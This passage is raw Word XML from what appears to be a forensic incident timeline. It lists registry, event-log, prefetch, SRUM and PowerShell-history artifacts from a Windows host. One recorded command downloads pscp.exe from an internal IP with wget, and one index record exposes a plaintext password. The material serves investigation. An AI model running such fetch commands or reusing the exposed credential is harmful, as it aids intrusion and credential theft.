              </w:rPr>
              <w:t>F-015, I-014, T-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: OpenSavePidlMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Opened/saved via dialog box</w:t>
              <w:br/>
              <w:t>This PC\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>txt mru=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_OpenSavePidlMRU.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015, T-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: LastVisitedPidlMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder used by an application (dialog box)</w:t>
              <w:br/>
              <w:t>This PC\Desktop</w:t>
              <w:br/>
              <w:t>appli=NOTEPAD.EXE mru=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_LastVisitedPidlMRU.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (indexed files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Indexed file: created</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>.txt size=38 owner=DESKTOP-KJ81A5A\medmondson user: medmondson</w:t>
              <w:br/>
              <w:br/>
              <w:t>pass: password123!@#</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sidr/DESKTOP-KJ81A5A_File_Report_20261019_151100.037119200.csv#1215</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\programdata\microsoft\search\data\applications\windows\Windows.edb</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015, I-014, T-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.728699</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=83576-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#134462</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:57</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: last modified</w:t>
              <w:br/>
              <w:t>System\notepad.exe</w:t>
              <w:br/>
              <w:t>not_my_pass.txt (Notepad) C:\Users\medmondson\Desktop\not_my_pass.txt (file:Unmapped GUID: //C:/Users/medmondson/Desktop/not_mypass.txt?VolumeId={B82366D2-0E5B-4C77-832C-871CFA42F90B}&amp;ObjectId={CA1D2D78-7FB5-11EE-8A95-000C2927F78F}&amp;KnownFolderId=ThisPCDesktopFolder&amp;KnownFolderLength=27) type=ExecuteOpen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/C/users/medmondson/Appdata/Local/ConnectedDevicesPlatform/L.medmondson/20261019171100_medmondson_Activity.csv#86</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\users\medmondson\Appdata\Local\ConnectedDevicesPlatform\L.medmondson\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:57.559456</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 13 | Microsoft-Windows-Sysmon | RegistryEvent (Value Set) | ProcessID: 4216, ProcessGUID: e6e9f951-1075-654e-d701-000000000500 | RuleName: T1060,RunKey | Image: C:\Users\MEDMON~1\AppData\Local\Temp\EU3403.tmp\MicrosoftEdgeUpdate.exe | EventType: SetValue | TargetObject: HKU\S-1-5-21-1841083384-974204330-411256071-1001\Software\Microsoft\Windows\CurrentVersion\R</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#19088</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:57.604874</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 11 | Microsoft-Windows-Sysmon | FileCreate | ProcessID: 1136, ProcessGUID: e6e9f951-0901-654e-1a00-000000000500 | RuleName: T1053 | Image: C:\Windows\system32\svchost.exe | TargetFilename: C:\Windows\System32\Tasks\MicrosoftEdgeUpdateTaskUserS-1-5-21-1841083384-974204330-411256071-1001Core{D843B141-3149-47D1-9EE1-6D3E61873AA0}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#19089</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:15:07.619336</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\PathUnknown\Directory with ID 0x000146ED-00000002\MSEDGE.PACKED.7Z</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=83694-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#135719</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:16:03.322916</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 11 | Microsoft-Windows-Sysmon | FileCreate | ProcessID: 7324, ProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | RuleName: ProcessHostingdotNETCode | Image: C:\Windows\explorer.exe | TargetFilename: C:\Users\medmondson\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\explorer.exe.log</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#19241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010, I-020, T-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:16:56.299955</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, previous)</w:t>
              <w:br/>
              <w:t>GKAPE.EXE</w:t>
              <w:br/>
              <w:t>runs=3 hash=274C6018 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#48</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\GKAPE.EXE-274C6018.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:17:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application timeline)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: end of application activity</w:t>
              <w:br/>
              <w:t>pscp.exe</w:t>
              <w:br/>
              <w:t>duration_ms=119993</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_AppTimelineProvider_Output.csv#949</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, T-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:21:49.347147</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>KAPE.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=34C8DA55 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#51</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\KAPE.EXE-34C8DA55.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001, F-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:36:48.063750</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PowerShell history (PSReadLine)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: mtime</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\AppData\Roaming\Microsoft\Windows\PowerShell\psreadline\ConsoleHost_history.txt</w:t>
              <w:br/>
              <w:t>command=wget http://10.0.0.12:8080/pscp.exe -o test.exe | order=3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/powershell_history.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Roaming\Microsoft\Windows\PowerShell\psreadline\ConsoleHost_history.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-009, I-007, T-008</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:36:48.063750</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PowerShell history (PSReadLine)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: mtime</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\AppData\Roaming\Microsoft\Windows\PowerShell\psreadline\ConsoleHost_history.txt</w:t>
              <w:br/>
              <w:t>command=.\pscp.exe | order=17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/powershell_history.jsonl#19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
